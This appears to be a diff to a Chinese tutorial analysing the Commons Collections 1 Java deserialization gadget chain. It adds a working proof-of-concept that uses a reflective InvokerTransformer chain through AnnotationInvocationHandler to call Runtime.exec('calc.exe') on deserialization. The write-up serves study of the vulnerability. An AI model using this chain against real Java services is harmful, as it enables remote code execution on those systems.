@@ -47,7 +47,7 @@ public class CommonCollections1 {
 // 对innerMap进行修饰,当返回对象outerMap put(null,value)时,调用了transformerChain.transform(value)
 // 实际上可以看到put内`key = transformKey(key);value = transformValue(value);`实际上调用的类和方法是相同的
 // 所以，TransformedMap.decorate(innerMap, transformerChain, null);同样可以触发漏洞
-public static Map decorate(Map map, Transformer keyTransformer, Transformer 10valueTransformer) {
+public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
     return new TransformedMap(map, keyTransformer, valueTransformer);
 }
 
@@ -193,7 +193,7 @@ try (FileOutputStream fos = new FileOutputStream("outerMap.ser");
 
 ### 8u71前的CommonCollections1
 
-先把最终的poc代码展示一下
+先把最终的poc代码展示一下，后面分析如何一步步改进得到该poc
 
 ```java
 public class CommonCollections1 {
@@ -349,20 +349,82 @@ public static void main(String[] args) throws Exception {
 
         Map innerMap = new HashMap();
         // new
-        innerMap.put("value", "xxxx");
+        innerMap.put("test", "xxxx");
         // new
         Map outerMap = TransformedMap.decorate(innerMap, null,
                 transformerChain);
     
-        Class clazz =
-                    Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
-            Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
-            construct.setAccessible(true);
-            Object obj = construct.newInstance(Retention.class, outerMap);
+        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
+        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
+        construct.setAccessible(true);
+        Object obj = construct.newInstance(Retention.class, outerMap);
+    
+    	ByteArrayOutputStream barr = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(barr);
+        oos.writeObject(obj);
+        oos.close();
+
+        System.out.println(barr);
+        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
+        Object o = ois.readObject();
     }
 ```
 
 这里还需解释一下两点，1.删除了`outerMap.put`，添加了`innerMap.put("value", "xxxx")`，这个后续再做解释；2.对于`AnnotationInvocationHandler`的获取采取的是反射的方式，而不是直接new，这是因为该类为default。
+
+运行现在的poc，发现它报错了，原因是java.lang.Runtime无法序列化
+
+![image-20240703211830502](./images/image-20240703211830502.png)
+
+java中的类要想反序列化，必须满足：
+
+* 实现 java.io.Serializable 接口
+* 所有属性必须是可序列化的。如果有一个属性不是可序列化的，则该属性必须注明是短暂的
+
+所以我们不能直接`new ConstantTransformer(Runtime.getRuntime())`，还是借助反射来获取Runtime.getRuntime()，所以我们将poc更改为，这里Runtime.class是Class对象，可以序列化
+
+```java
+public static void main(String[] args) throws Exception {
+         Transformer[] transformers = new Transformer[] {
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer("getMethod", new Class[] { String.class,
+                        Class[].class }, new
+                        Object[] { "getRuntime",
+                        new Class[0] }),
+                new InvokerTransformer("invoke", new Class[] { Object.class,
+                        Object[].class }, new
+                        Object[] { null, new Object[0] }),
+                new InvokerTransformer("exec", new Class[] { String.class },
+                        new String[] {
+                                "calc.exe" }),
+        };
+        // ......
+    }
+```
+
+这里分析一下反射获取Runtime对象的过程
+
+```java
+Class cls = Runtime.class.getClass();
+Method method = cls.getMethod("getMethod", new Class[] { String.class,
+                        Class[].class });
+Object object = method.invoke(Runtime.class, new Object[]{"getRuntime",
+                        new Class[0] });
+// 上面的代码等同于Object object = Runtime.class.getMethod("getRuntime", new Class[0])，object作为后面的input
+
+Class cls = input.getClass();
+Method method = cls.getMethod("invoke", new Class[] { Object.class,
+                        Object[].class });
+Object object = method.invoke(input, new Object[]{null, new Object[0]});
+// 等同于object = input.invoke(null, new Object[0])，getRuntime方法是静态的，所以传递的参数为(null, new Object[0])
+
+Class cls = input.getClass();
+Method method = cls.getMethod("exec", new Class[] { String.class });
+Object object = method.invoke(input, new String[] {"calc.exe"});
+// 等同于object = input.exec("calc.exe")
+```
+
+继续运行改进后的poc，发现没有异常，但是也没有弹出计算机，对比现在poc和最终poc，发现只有一处不同`innerMap.put("test", "xxxx");`和`innerMap.put("value", "xxxx");`，这一点不同是如何影响我们的poc的，我们需要在调试中找到答案。
 
 
 
